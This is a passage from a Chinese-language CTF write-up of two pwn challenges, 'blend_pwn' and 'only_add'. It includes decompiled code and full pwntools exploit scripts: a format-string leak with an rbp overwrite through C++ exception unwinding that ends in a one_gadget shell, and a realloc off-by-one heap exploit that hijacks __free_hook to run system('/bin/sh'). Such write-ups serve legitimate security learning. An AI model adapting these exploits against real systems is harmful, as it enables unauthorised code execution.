punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index %d:%s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>打印所有chunk的内容</p><p>综合下来，程序总共有两个漏洞，gift功能中的一个栈溢出(可以溢出到rbp)，还有del功能中的一个uaf</p><p>我在ctf-all-in-one这本书里看到过一题，利用的就是c++的异常处理机制，所以看到这道题就猜测可能和c++的异常处理机制有关，可惜不知道从何利用，太菜了，还是因为ex师傅和r4bbit师傅提点才明白了怎么做。</p><p>实际上这题可以不用堆的相关操作，因为涉及到C++的异常处理机制，有些复杂，这里长话短说，<del>实际上是因为我也没太懂</del>，在异常被抛出捕获且正确处理后，为了所有生命期已结束的对象都会被正确地析构，它们所占用的空间会被正确地回收，会触发栈回退（Stack Unwind）机制。栈回退机制会重建函数调用现场，rbp自然属于函数调用的一部分，在gift功能中我们能够溢出到rbp，于是我们可以伪造rbp，当异常处理完毕后就会恢复函数现场，调用<code>leave ret</code>，实现栈迁移，栈就会恢复到我们伪造的rbp处。</p><p>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.99'</span><span class="token punctuation">,</span> <span class="token number">52504</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io=process('./blend_pwn')</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./blend_pwn'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your choice >'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your choice >'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input note:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your choice >'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your choice >'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gift</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your choice >'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'666'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input what you want:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please enter a name: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%lx'</span><span class="token punctuation">)</span>show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Current user:'</span><span class="token punctuation">)</span>stack<span class="token operator">=</span>int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x26c0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%7$lx'</span>gift<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Current user:'</span><span class="token punctuation">)</span>pro_base<span class="token operator">=</span>int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1266</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'pro_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pro_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x26d8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%2$lx'</span>gift<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Current user:'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c6780</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>onegadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x4527a</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x26d8</span> <span class="token operator">-</span> <span class="token number">0x110</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'csh'</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>gift<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x45226 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4527a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf0364 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1207 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''</span></code></pre><p>整体就是通过printf泄露libc地址，然后将rbp伪造成main函数的rbp就能够重新执行程序。</p><h2 id="0x3-only-add"><a href="#0x3-only-add" class="headerlink" title="0x3.only_add"></a>0x3.only_add</h2><p>保护全开</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei-pwn-ti-jie/5.jpg" alt=""></p><p>一共俩功能，add功能如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">sub_A01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">0x500</span> <span class="token punctuation">)</span>    <span class="token function">sub_9A5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">&amp;&amp;</span> v1 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Data:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> v1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>通过realloc申请最大0x500的chunk，并且存在<code>off-by-one</code>，并且当前只能存在一个chunk</p><p>第二个功能如下</p><pre class=" language-c"><code class="language-c">__int64 <span class="token function">sub_9BF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_202010<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_202010 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Bye"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    buf <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">--</span>dword_202010<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>清除buf，即清除堆地址，然后关闭标准输出。</p><p>realloc函数根据不同的情况有不同的功能</p><pre class=" language-c"><code class="language-c"><span class="token function">realloc</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token number">1</span><span class="token punctuation">.</span>ptr <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">:</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token number">2</span><span class="token punctuation">.</span>ptr <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> size <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">:</span> <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token number">3</span><span class="token punctuation">.</span>ptr <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> size <span class="token operator">==</span> old_size <span class="token punctuation">:</span> <span class="token function">edit</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token number">3</span><span class="token punctuation">.</span>ptr <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> size <span class="token operator">&lt;</span> old_size <span class="token punctuation">:</span> <span class="token function">edit</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> and <span class="token function">free</span><span class="token punctuation">(</span>remainder<span class="token punctuation">)</span><span class="token number">4</span><span class="token punctuation">.</span>ptr <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> size <span class="token operator">></span> old_size <span class="token punctuation">:</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>new_ptr<span class="token punctuation">,</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> new_ptr</code></pre><p>这题改堆风水改到头疼，先贴上exp吧，1/16的几率</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepcontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Data:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_no</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free_no</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x488</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x418</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x4a8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x438</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x418</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x488</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x418</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x3e0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0x5760</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p16<span class="token punctuation">(</span><span class="token number">0x5760</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span>                    <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ed8b0</span>    <span class="token keyword">if</span> libc_base <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">0x3ed8b0</span><span class="token punctuation">:</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>        free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        init<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0xb8</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0xb8</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0x218</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">31</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token number">-8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token number">-8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'exec 1>&amp;2'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#gdb.attach(io)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> io    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x4f2c5 execve("/bin/sh", rsp+0x40, environ)constraints:  rsp &amp; 0xf == 0  rcx == NULL0x4f322 execve("/bin/sh", rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0x10a38c execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''</span></code></pre><p>就不一步步调了。。。再调就裂开了，讲讲整体思路吧</p><p>首先没有libc地址，肯定得泄露libc地址的，也没有show，自然得通过改<code>stdout</code>结构体来泄露libc地址，这样我们就需要将<code>main_arena</code>地址落到某个<code>tcache</code>的<code>fd</code>位上，然后修改其后四位以此来申请到<code>stdout</code>结构体。如何获得<code>main_arena</code>地址呢，这题也没有<code>free</code>函数，这就需要利用到<code>realloc</code>的free功能了，我们先申请一个大chunk，比如<code>0x448</code>大小的，然后继续申请<code>0x418</code>大小的，由于<code>realloc</code>的指针没变，所以直接在原<code>0x448</code>大小的<code>chunk</code>上切割下来一块<code>0x420</code>大小的<code>chunk</code>，剩下的<code>0x30</code>的<code>chunk</code>就会被<code>free</code>掉丢入<code>tcache</code>中，接着我们再申请0字节大小的<code>chunk</code>，也就是<code>realloc(ptr,0)</code>，这就相当于<code>free</code>功能，这样这块<code>0x420</code>大小的<code>chunk</code>就会被丢入<code>unsorted bin</code>中，<code>main_arena</code>地址到手。</p><p>有了<code>main_arena</code>地址地址，我们还需要构造堆重叠，这样我们才可以修改tcache的fd，如何构造出堆重叠？自然就需要<code>off-by-one</code>功能了，我们通过<code>unsorted bin</code>上方的一个<code>chunk</code>来改大<code>unsorted 